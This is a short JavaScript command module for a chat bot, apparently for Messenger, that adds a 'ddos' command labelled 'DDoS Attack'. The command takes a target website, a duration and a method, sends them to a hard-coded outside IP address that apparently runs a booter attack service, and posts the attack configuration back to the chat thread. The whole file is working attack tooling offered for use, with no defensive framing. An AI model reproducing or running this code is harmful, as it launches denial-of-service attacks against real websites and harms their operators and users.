const axios = require('axios');

module.exports = {
  config: {
    name: 'ddos',
    version: '1.0.0',
    hasPermssion: 1,
    credits: 'Mây Trắng',
    description: 'DDoS Attack',
    commandCategory: 'Spam',
    usages: '[web] [time] [method]',
    cooldowns: 10
  },

  run: async function({ api, event, args }) {
    const [web, time, method] = args;

    if (!web || !time || !method) {
      return api.sendMessage('[web] [time] [method tls -https - h2-bp]', event.threadID);
    }

    try {
      const response = await axios.get(`http://165.22.49.225:8080?key=1234&host=${web}&time=${time}&method=${method}`);
      const { status, running, host, time: attackTime, method: attackMethod, code } = response.data;

      api.sendMessage(`
        𝗬𝗼𝘂𝗿 𝗮𝘁𝘁𝗮𝗰𝗸 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝘀𝗲𝗻𝘁!
 
        𝗔𝘁𝘁𝗮𝗰𝗸 𝗖𝗼𝗻𝗳𝗶𝗴𝘂𝗿𝗮𝘁𝗶𝗼𝗻:
        • 𝗛𝗼𝘀𝘁: ${host}
        • 𝗧𝗶𝗺𝗲: ${attackTime}
        • 𝗠𝗲𝘁𝗵𝗼𝗱: ${attackMethod}
        • 𝗨𝘀𝗲𝗱 𝗖𝗼𝗻𝗰𝘂𝗿𝗿𝗲𝗻𝘁𝘀: ${running}
      `, event.threadID);
    } catch (error) {
      console.error(error);
      api.sendMessage('⚠️ Có lỗi xảy ra, vui lòng thử lại sau', event.threadID);
    }
  }
};